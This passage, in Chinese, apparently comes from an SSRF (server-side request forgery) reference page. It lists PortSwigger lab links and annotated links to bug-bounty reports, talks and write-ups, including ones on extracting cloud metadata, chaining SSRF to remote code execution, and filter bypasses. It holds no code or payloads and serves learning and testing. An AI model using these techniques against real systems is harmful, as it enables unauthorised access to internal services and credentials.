- 使用白名单输入过滤器的SSRF：[SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- 通过开放重定向漏洞绕过SSRF过滤器：[SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)


## 参考

- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)：关于服务器端浏览被认为有害的研究。
- [通过SSRF在Google收购中提取AWS元数据 - tghawkins - 2017-12-13](https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)：描述了如何通过SSRF漏洞提取AWS元数据。
- [ESEA服务器端请求伪造和查询AWS元数据](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/)：Brett Buerhaus关于ESEA服务器端请求伪造和查询AWS元数据的分析。
- [视频转GIF转换器中的SSRF和本地文件读取](https://hackerone.com/reports/115857)：黑客在视频转GIF转换器中发现SSRF和本地文件读取漏洞的报告。
- [imgur.com上的SSRF漏洞](https://hackerone.com/reports/115748)：在imgur.com的vidgif功能中发现SSRF漏洞的报告。
- [DuckDuckGo代理服务器SSRF漏洞](https://hackerone.com/reports/358119)：在DuckDuckGo的proxy.duckduckgo.com中发现SSRF漏洞的报告。
- [黑客一号错误页面上的盲SSRF漏洞](https://hackerone.com/reports/374737)：在黑客一号的错误页面上发现的盲SSRF漏洞报告。
- [ShopifyCloud.com上的SSRF漏洞](https://hackerone.com/reports/382612)：在ShopifyCloud.com上发现的SSRF漏洞报告。
- [黑客一号：如何：服务器端请求伪造（SSRF）](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)：关于服务器端请求伪造（SSRF）的技术指南。
- [通过URL滥用进行SSRF的绝佳资源](https://twitter.com/albinowax/status/890725759861403648)：提供了一系列关于利用URL进行SSRF的资源。
- [如何在GitHub企业版上链接4个漏洞，从SSRF执行链到RCE！Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)：Orange Tsai描述如何在GitHub企业版上链接4个漏洞的案例。
- [HITBGSEC 2017 SG会议D1 - SSRF的新时代 - 利用URL解析器 - Orange Tsai](https://www.youtube.com/watch?v=D1S-G8rJrEk)：Orange Tsai在HITBGSEC 2017会议上的演讲视频。
- [SSRF技巧 - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)：提供了一些关于SSRF的技巧和最佳实践。
- [在Jira中利用SSRF转换为XSS的方法](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)：介绍了如何在Jira中将SSRF漏洞转换为XSS攻击的方法。
- [穿透面纱：通过服务器端请求伪造访问NIPRNet](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)：描述了如何通过SSRF漏洞访问敏感网络的案例。
- [黑客101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)：有关SSRF的视频教程。
- [利用SSRF漏洞攻击GCE/GKE实例的例子](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)：提供了利用SSRF漏洞攻击Google Cloud Engine（GCE）和Google Kubernetes Engine（GKE）实例的具体例子。
- [SSRF - 服务器端请求伪造（类型和利用方法）第一部分 - SaN ThosH - 2019年1月10日](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)：介绍了SSRF的类型和利用方法。
- [明文凭证处理器中的SSRF协议走私：LDAP - @0xrst](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)：讨论了在明文凭证处理器中如何进行SSRF协议走私。
- [X-CTF决赛2016 - John Slick（Web 25）- YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)：关于X-CTF决赛中Web 25题目的解析。
- [利用AWS Elastic Beanstalk中的SSRF漏洞 - 2019年2月1日 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)：描述了如何利用AWS Elastic Beanstalk中的SSRF漏洞。
- [PortSwigger - Web安全学院服务器端请求伪造（SSRF）](https://portswigger.net/web-security/ssrf)：提供了关于SSRF的详细教程。
- [SVG SSRF秘籍 - Allan Wirth (@allanlw) - 2019年12月6日](https://github.com/allanlw/svg-cheatsheet)：提供了关于SVG SSRF的秘籍和技巧。
- [SSRF's up! 真实世界的服务器端请求伪造（SSRF） - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)：关于真实世界中SSRF攻击案例分析的文章。
- [挑战1：来吧，出来吧，无论你在哪里！](https://www.kieranclaessens.be/cscbe-web-2018.html)：网络安全挑战的描述。
- [攻击Java中的URLs](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)：关于如何攻击Java应用程序中的URLs的指南。
- [SSRF：不要编码整个IP](https://twitter.com/thedawgyg/status/1224547692967342080)：关于在处理SSRF时不应编码整个IP地址的建议。
